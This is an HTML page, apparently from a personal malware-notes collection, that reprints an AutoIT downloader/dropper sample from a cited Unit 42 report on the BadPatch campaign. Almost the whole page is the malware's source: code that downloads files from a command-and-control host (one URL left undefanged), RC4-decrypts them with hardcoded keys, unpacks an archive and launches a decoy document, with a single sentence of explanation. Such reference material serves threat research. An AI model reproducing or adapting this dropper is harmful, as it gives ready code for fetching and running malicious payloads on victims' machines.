<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>AutoIT Downloader/Dropper</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># AutoIT Downloader/Dropper</h1></strong><br />This AutoIT script downloads a file from a C2 server and executes it.<br /><br />Source: <a href="https://unit42.paloaltonetworks.com/unit42-badpatch/">https://unit42.paloaltonetworks.com/unit42-badpatch/</a><br /><div class="codebox"><div class="codebox">gtyu()<br />_zizi2()<br />Func&nbsp;_zizi2()<br />&nbsp;&nbsp;Local&nbsp;$sfilepath&nbsp;=&nbsp;_winapi_gettempfilename(@TempDir)<br />&nbsp;&nbsp;Local&nbsp;$hdownload&nbsp;=&nbsp;InetGet(&quot;http://www.pal4u.net/zzzzz&quot;,&nbsp;$sfilepath,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$inet_forcereload,&nbsp;$inet_downloadbackground)<br />&nbsp;&nbsp;Do<br />&nbsp;&nbsp;&nbsp;&nbsp;Sleep(250)<br />&nbsp;&nbsp;&nbsp;&nbsp;Until&nbsp;InetGetInfo($hdownload,&nbsp;$inet_downloadcomplete)<br />&nbsp;&nbsp;&nbsp;&nbsp;InetClose($hdownload)<br />&nbsp;&nbsp;&nbsp;&nbsp;Local&nbsp;$ialgorithm&nbsp;=&nbsp;$calg_rc4<br />&nbsp;&nbsp;&nbsp;&nbsp;If&nbsp;_crypt_decryptfile($sfilepath,&nbsp;&quot;F:\ddd.zip&quot;,&nbsp;&quot;?&gt;&lt;MNBVCXZ&quot;,&nbsp;$ialgorithm)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;Then<br />	Sleep(250)<br />	Local&nbsp;$zip1&nbsp;=&nbsp;_ezezez(&quot;F:\ddd.rar&quot;,&nbsp;&quot;F:\&quot;)<br />&nbsp;&nbsp;&nbsp;&nbsp;EndIf<br />EndFunc<br />Func&nbsp;gtyu()<br />&nbsp;&nbsp;Local&nbsp;$sfilepath&nbsp;=&nbsp;_winapi_gettempfilename(@TempDir)<br />&nbsp;&nbsp;Local&nbsp;$hdownload&nbsp;=&nbsp;InetGet(&quot;h__p://www.pal4u[.]net/dddd&quot;,&nbsp;$sfilepath,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$inet_forcereload,&nbsp;$inet_downloadbackground)<br />&nbsp;&nbsp;Do<br />&nbsp;&nbsp;&nbsp;&nbsp;Sleep(250)<br />&nbsp;&nbsp;&nbsp;&nbsp;Until&nbsp;InetGetInfo($hdownload,&nbsp;$inet_downloadcomplete)<br />&nbsp;&nbsp;&nbsp;&nbsp;InetClose($hdownload)<br />&nbsp;&nbsp;&nbsp;&nbsp;Local&nbsp;$ialgorithm&nbsp;=&nbsp;$calg_rc4<br />&nbsp;&nbsp;&nbsp;&nbsp;If&nbsp;_crypt_decryptfile($sfilepath,&nbsp;&quot;F:\dd.docx&quot;,&nbsp;&quot;ZXCVBNM&lt;&gt;?&quot;,&nbsp;$ialgorithm)<br />&nbsp;&nbsp;&nbsp;&nbsp;Then<br />	ShellExecute(&quot;F:\dd.docx&quot;)<br />&nbsp;&nbsp;&nbsp;&nbsp;EndIf<br />EndFunc<br />Func&nbsp;_ezezez($szipfile,&nbsp;$sdestinationfolder,&nbsp;$sfolderstructure&nbsp;=&nbsp;&quot;&quot;)<br />&nbsp;&nbsp;Local&nbsp;$i<br />&nbsp;&nbsp;Do<br />&nbsp;&nbsp;&nbsp;&nbsp;$i&nbsp;+=&nbsp;1<br />&nbsp;&nbsp;&nbsp;&nbsp;$stempzipfolder&nbsp;=&nbsp;@TempDir&nbsp;&amp;&nbsp;&quot;\Temporary&nbsp;Directory&nbsp;&quot;&nbsp;&amp;&nbsp;$i&nbsp;&amp;&nbsp;&quot;&nbsp;for&nbsp;&quot;&nbsp;&amp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StringRegExpReplace($szipfile,&nbsp;&quot;.*\\&quot;,&nbsp;&quot;&quot;)<br />&nbsp;&nbsp;Until&nbsp;NOT&nbsp;FileExists($stempzipfolder)<br />&nbsp;&nbsp;Local&nbsp;$oshell&nbsp;=&nbsp;ObjCreate(&quot;Shell.Application&quot;)<br />&nbsp;&nbsp;If&nbsp;NOT&nbsp;IsObj($oshell)&nbsp;Then<br />&nbsp;&nbsp;&nbsp;&nbsp;Return&nbsp;SetError(1,&nbsp;0,&nbsp;0)<br />&nbsp;&nbsp;EndIf<br />&nbsp;&nbsp;Local&nbsp;$odestinationfolder&nbsp;=&nbsp;$oshell.namespace($sdestinationfolder)<br />&nbsp;&nbsp;If&nbsp;NOT&nbsp;IsObj($odestinationfolder)&nbsp;Then<br />&nbsp;&nbsp;&nbsp;&nbsp;DirCreate($sdestinationfolder)<br />&nbsp;&nbsp;EndIf<br />&nbsp;&nbsp;Local&nbsp;$ooriginfolder&nbsp;=&nbsp;$oshell.namespace($szipfile&nbsp;&amp;&nbsp;&quot;\&quot;&nbsp;&amp;&nbsp;$sfolderstructure)<br />&nbsp;&nbsp;If&nbsp;NOT&nbsp;IsObj($ooriginfolder)&nbsp;Then<br />&nbsp;&nbsp;&nbsp;&nbsp;Return&nbsp;SetError(3,&nbsp;0,&nbsp;0)<br />&nbsp;&nbsp;EndIf<br />&nbsp;&nbsp;Local&nbsp;$ooriginfile&nbsp;=&nbsp;$ooriginfolder.items()<br />&nbsp;&nbsp;If&nbsp;NOT&nbsp;IsObj($ooriginfile)&nbsp;Then<br />&nbsp;&nbsp;&nbsp;&nbsp;Return&nbsp;SetError(4,&nbsp;0,&nbsp;0)<br />&nbsp;&nbsp;EndIf<br />&nbsp;&nbsp;$odestinationfolder.copyhere($ooriginfile,&nbsp;20)<br />&nbsp;&nbsp;DirRemove($stempzipfolder,&nbsp;1)<br />&nbsp;&nbsp;Return&nbsp;1<br />EndFunc</div></div><br /><br /><br /><br /><br /></div>
</body>
</html>
